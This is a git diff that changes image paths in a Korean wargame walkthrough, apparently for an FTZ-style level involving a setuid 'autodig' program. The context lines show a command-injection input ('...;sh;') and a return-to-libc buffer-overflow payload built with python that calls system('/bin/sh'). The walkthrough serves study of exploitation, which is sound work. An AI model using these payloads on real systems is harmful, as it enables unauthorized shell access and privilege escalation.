@@ -4,13 +4,13 @@
 
 1. hint
 
-   ![](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1578892627599.png)
+   ![](./images/1578892627599.png)
 
 
 
 2. `/etc/xinetd.d`에서 backdoor 파일 확인
 
-   ![](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572942324076.png)
+   ![](./images/1572942324076.png)
 
 
 
@@ -70,7 +70,7 @@
 
    `echo $PATH`
 
-   ![](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572590486253.png)
+   ![](./images/1572590486253.png)
 
    - `/bin` 이 환경 변수 PATH에 지정되어 있으므로 `/bin`에 있는 파일은 이름만으로 실행 가능
 
@@ -82,7 +82,7 @@
 
      `autodig`
 
-     ![1572590586521](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572590586521.png)
+     ![1572590586521](./images/1572590586521.png)
 
      ​	→ argc가 2개가 아님 (argc = 1)
 
@@ -92,7 +92,7 @@
 
      `autodig 168.126.63.1 www.naver.com`
 
-     ![1572590737920](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572590737920.png)
+     ![1572590737920](./images/1572590737920.png)
 
      ​	→ argc가 2개가 아님 (argc = 3)
 
@@ -102,7 +102,7 @@
 
      `autodig "168.126.63.1 www.naver.com"`
 
-     ![1572591403173](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572591403173.png)
+     ![1572591403173](./images/1572591403173.png)
 
      ​	→ argc = 2
 
@@ -118,7 +118,7 @@
 
      - `pwd; id; ls -ld /etc`
 
-       ![1572668178064](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572668178064.png)
+       ![1572668178064](./images/1572668178064.png)
 
        ​	→ `pwd`, `id`, `ls -ld /etc` 명령어를 차례로 실행
 
@@ -126,7 +126,7 @@
 
      - `pwddd; id; ls -ld /etc`
 
-       ![1572668385934](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572668385934.png)
+       ![1572668385934](./images/1572668385934.png)
 
        ​	→ `;` 를 이용한 명령어는 앞 명령어가 틀려도 뒷 명령어 실행 가능
 
@@ -134,7 +134,7 @@
 
      - `pwd && id && ls -ld /etc`
 
-       ![1572668279714](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572668279714.png)
+       ![1572668279714](./images/1572668279714.png)
 
        ​	→ `pwd`, `id`, `ls -ld /etc` 명령어를 차례로 실행
 
@@ -142,7 +142,7 @@
 
      - `pwddd && id &&& ls -ld /etc`
 
-       ![1572668468868](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572668468868.png)
+       ![1572668468868](./images/1572668468868.png)
 
        ​	→ `&&` 를 이용한 명령어는 앞 명령어가 틀리면 뒷 명령어 실행 불가능
 
@@ -150,7 +150,7 @@
 
    - `autodig "168.126.63.1 www.naver.com;sh;"`
 
-     ![](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572668846691.png)
+     ![](./images/1572668846691.png)
 
      ​	→ `dig 168.126.63.1 www.naver.com;sh; version.bind chaos txt` 를 실행한 결과와 같음
 
@@ -160,7 +160,7 @@
 
    - `autodig "168.126.63.1 www.naver.com;my-pass;"`
 
-     ![1572668920547](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572668920547.png)
+     ![1572668920547](./images/1572668920547.png)
 
      ​	→ `dig 168.126.63.1 www.naver.com;my-pass; version.bind chaos txt` 를 실행한 결과와 같음
 
@@ -180,7 +180,7 @@
 
    - 메모리 구조 분석
 
-     ![1572669094777](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572669094777.png)
+     ![1572669094777](./images/1572669094777.png)
 
    ​	→ 0x78 = 120
 
@@ -199,7 +199,7 @@
 
      - system() 함수의 주소
 
-       ![](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572940428687.png)
+       ![](./images/1572940428687.png)
 
        
 
@@ -207,11 +207,11 @@
 
        - `vi findshell.c` 명령어로 findshell.c 파일 만들기
 
-         ![1572940544315](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572940544315.png)
+         ![1572940544315](./images/1572940544315.png)
 
        - findshell.c 파일 컴파일 및 실행
 
-         ![1572940582569](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572940582569.png)
+         ![1572940582569](./images/1572940582569.png)
 
          
 
@@ -221,7 +221,7 @@
      autodig `python -c 'print "A"*119+"\xc0\xf2\x03\x42"+"A*4"+"\xa4\x7e\x12\x42"'`
      ```
 
-     ![1572940776853](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572940776853.png)
+     ![1572940776853](./images/1572940776853.png)
 
      - 메모리 구조 분석
 
@@ -247,17 +247,17 @@
 
      - `export MYSHELL="/bin/sh"`
 
-       ![1572941394533](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572941394533.png)
+       ![1572941394533](./images/1572941394533.png)
 
      - 환경변수 `MYSHELL` 주소 확인
 
        - `vi getmyshell.c` 명령어로 getmyshell.c 파일 만들기
 
-         ![1572941635873](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572941635873.png)
+         ![1572941635873](./images/1572941635873.png)
 
        - getmyshell.c 파일 컴파일 및 실행
 
-         ![1572941668858](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572941668858.png)
+         ![1572941668858](./images/1572941668858.png)
 
    
 
@@ -267,7 +267,7 @@
      autodig `python -c 'print "A"*119+"\xc0\xf2\x03\x42"+"A*4"+"\x6f\xff\xff\xbf"'`
      ```
 
-     ![](C:\Users\YONGHA.LEE\AppData\Roaming\Typora\typora-user-images\1572941830513.png)
+     ![](./images/1572941830513.png)
 
      ​	⇒ `system(/bin/sh)`
 
